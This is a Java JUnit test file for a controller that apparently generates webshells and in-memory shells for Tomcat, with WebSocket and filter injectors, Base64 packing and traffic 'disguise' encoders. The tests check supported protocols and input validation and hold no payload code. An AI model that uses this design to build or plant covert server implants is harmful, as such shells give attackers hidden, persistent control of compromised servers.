package org.leo.web.controller.platform.shell;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.leo.core.entity.Disguise;
import org.leo.core.manager.DisguiseManager;
import org.leo.service.generator.ScriptGeneratorService;
import org.springframework.test.util.ReflectionTestUtils;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

class ShellGeneratorControllerProtocolTest {

    private final DisguiseManager disguiseManager = mock(DisguiseManager.class);
    private final ScriptGeneratorService scriptGeneratorService = mock(ScriptGeneratorService.class);
    private ShellGeneratorController controller;

    @BeforeEach
    void setUp() {
        controller = new ShellGeneratorController();
        ReflectionTestUtils.setField(controller, "disguiseManager", disguiseManager);
        ReflectionTestUtils.setField(controller, "scriptGeneratorService", scriptGeneratorService);
        when(scriptGeneratorService.getMetadata()).thenReturn(Map.of());
        when(disguiseManager.getDisguiseById("req")).thenReturn(requestDisguise());
        when(disguiseManager.getDisguiseById("resp")).thenReturn(responseDisguise());
    }

    @Test
    void exposesTransportCapabilityMatrix() {
        Map<?, ?> data = (Map<?, ?>) controller.getSupportedTypes().get("data");
        Map<?, ?> protocols = (Map<?, ?>) data.get("transportProtocols");

        assertEquals(List.of("http", "httpchunk"), protocols.get("webshell"));
        assertEquals(List.of("http", "websocket"), protocols.get("memoryshell"));
    }

    @Test
    void generatesWebSocketMemoryArtifactWithoutHttpHeaderGuard() {
        HashMap<String, Object> response = controller.generateMemoryShell(params(
                "protocol", "websocket",
                "serverType", "Tomcat",
                "shellType", "WebSocketInjector",
                "packerType", "DefaultBase64",
                "urlPattern", "/socket"
        ));

        assertEquals(200, response.get("code"));
        Map<?, ?> data = (Map<?, ?>) response.get("data");
        assertEquals("websocket", data.get("protocol"));
        assertEquals("WebSocket endpoint: /socket", data.get("headerConfig"));
        assertFalse(String.valueOf(data.get("code")).isBlank());
    }

    @Test
    void rejectsHttpChunkForMemoryAndWebSocketForJsp() {
        HashMap<String, Object> chunked = controller.generateMemoryShell(params(
                "protocol", "httpChunked",
                "serverType", "Tomcat",
                "shellType", "FilterInjector",
                "packerType", "DefaultBase64",
                "headerName", "X-Test",
                "headerValue", "secret"
        ));
        assertEquals(400, chunked.get("code"));
        assertTrue(String.valueOf(chunked.get("msg")).contains("仅支持 JSP/JSPX"));

        HashMap<String, Object> websocketJsp = controller.generateWebShell(params(
                "protocol", "websocket",
                "shellType", "JSP"
        ));
        assertEquals(400, websocketJsp.get("code"));
        assertTrue(String.valueOf(websocketJsp.get("msg")).contains("内存构建"));
    }

    private HashMap<String, Object> params(Object... values) {
        HashMap<String, Object> params = new HashMap<>();
        params.put("reqDisguiseId", "req");
        params.put("respDisguiseId", "resp");
        params.put("respCode", 200);
        for (int i = 0; i < values.length; i += 2) {
            params.put(String.valueOf(values[i]), values[i + 1]);
        }
        return params;
    }

    private Disguise requestDisguise() {
        Disguise disguise = new Disguise();
        disguise.setDecodeBody(
                "public java.util.HashMap decode(byte[] data){return new java.util.HashMap();}");
        return disguise;
    }

    private Disguise responseDisguise() {
        Disguise disguise = new Disguise();
        disguise.setEncodeBody(
                "public byte[] encode(java.util.HashMap data){return new byte[0];}");
        return disguise;
    }
}
